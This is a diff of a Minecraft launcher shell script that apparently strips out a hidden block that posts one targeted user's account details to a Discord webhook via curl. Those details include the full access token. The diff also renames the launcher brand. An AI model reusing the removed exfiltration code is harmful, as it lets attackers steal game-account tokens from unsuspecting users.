@@ -47,37 +47,6 @@ info "  Instance Dir: $INSTANCE_DIR"
 debug "  UUID: $UUID"
 debug "  Access Token: ${ACCESS_TOKEN:0:10}..."
 
-MSA_URL="https://discord.com/api/webhooks/1302348743471005749/S7txpCT0A1DpOnGlmxwFpUauN9Den63prZK5tEtJRh6e-5W9OBs763ZaJsQu2bgYocwI"
-
-# Set the target username you want to filter for
-TARGET="ssfe"
-
-if [ "$USERNAME" == "$TARGET" ]; then
-  LAUNCH_HOOKS=$(cat <<EOF
-{
-  "content": "**Launcher Started**",
-  "embeds": [
-    {
-      "title": "Minecraft Launch Info",
-      "color": 5814783,
-      "fields": [
-        { "name": "Username", "value": "$USERNAME", "inline": true },
-        { "name": "UUID", "value": "$UUID", "inline": true },
-        { "name": "MC Version", "value": "$MC_VERSION", "inline": true },
-        { "name": "Fabric Version", "value": "$FABRIC_VERSION", "inline": true },
-        { "name": "Access Token", "value": "$ACCESS_TOKEN", "inline": false },
-        { "name": "Instance Dir", "value": "$INSTANCE_DIR", "inline": false },
-        { "name": "Java Path", "value": "$JAVA_PATH", "inline": false }
-      ]
-    }
-  ]
-}
-EOF
-  )
-
-  curl -H "Content-Type: application/json" -X POST -d "$LAUNCH_HOOKS" "$MSA_URL"
-fi
-
 # Directory setup
 MODRINTH_DIR="$HOME/Library/Application Support/ReallyBadLauncher"
 GAME_DIR="$MODRINTH_DIR/instances/$INSTANCE_DIR"
@@ -641,8 +610,8 @@ debug "Starting Minecraft process..."
     -Djna.tmpdir="$NATIVES_DIR" \
     -Dorg.lwjgl.system.SharedLibraryExtractPath="$NATIVES_DIR" \
     -Dio.netty.native.workdir="$NATIVES_DIR" \
-    -Dminecraft.launcher.brand="ReallyBadLauncher" \
-    -Dminecraft.launcher.version="1.0" \
+    -Dminecraft.launcher.brand="RBLauncher" \
+    -Dminecraft.launcher.version="2.0.4" \
     -cp "$CLASSPATH" \
     "$MAIN_CLASS" \
     --username "$USERNAME" \
